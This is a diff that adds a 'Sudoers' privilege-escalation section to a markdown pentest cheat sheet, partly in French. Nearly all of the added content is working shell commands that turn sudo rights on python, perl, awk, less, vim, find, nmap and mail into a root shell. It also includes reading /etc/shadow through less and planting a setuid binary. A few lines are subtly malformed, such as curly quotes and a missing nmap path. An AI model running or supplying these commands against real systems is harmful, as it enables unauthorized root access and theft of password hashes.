@@ -68,3 +68,72 @@ cat /etc/ssh/ssh_host_key
 ## Automated enumeration
 
 ## Privesc
+
+#### Sudoers
+
+##### python privesc
+```
+sudo -u root /usr/bin/python
+>>> from subprocess import call
+>>> call(['/bin/bash'])
+```
+##### perl privesc
+```
+sudo -u root /usr/bin/perl -e ‘`/bin/bash`’
+```
+
+##### cp + chmod
+```
+sudo -u root /bin/cp exploit exploit
+sudo -u root /bin/chmod +xs exploit
+./exploit
+```
+
+##### awk
+```
+awk 'BEGIN {system("/bin/bash")}'
+```
+
+##### less
+```
+Solution 1 - read a file
+sudo -u root /usr/bin/less /etc/shadow
+ 
+Solution 2 - create file
+sudo -u root /usr/bin/less 
+
+Solution 2 : on obtient un shell avec les droits à de victim à l'aide de less
+Pour commencer il faut ouvrir un fichier avec less comme par exemple /etc/passwd
+Puis, il faut écrire (comme pour quitter vim et comme dans l'exemple précédent):
+!/bin/bash
+```
+
+##### vim
+```
+sudo -u victim /usr/bin/vim
+puis on tape (pas dans le fichier mais de la même manière que lorsque l'on souhaite quitter vim):
+:!/bin/bash
+```
+
+##### find
+```
+sudo -u root /usr/bin/find /bin -name "bash" -exec {} \;
+```
+
+##### Bash
+```
+sudo -u root /bin/bash
+```
+
+##### nmap
+```
+ sudo -u nmap –interactive
+nmap>!bash
+or
+nmap>!sh
+```
+
+##### Mail
+```
+sudo mail --exec='!/bin/bash'
+```
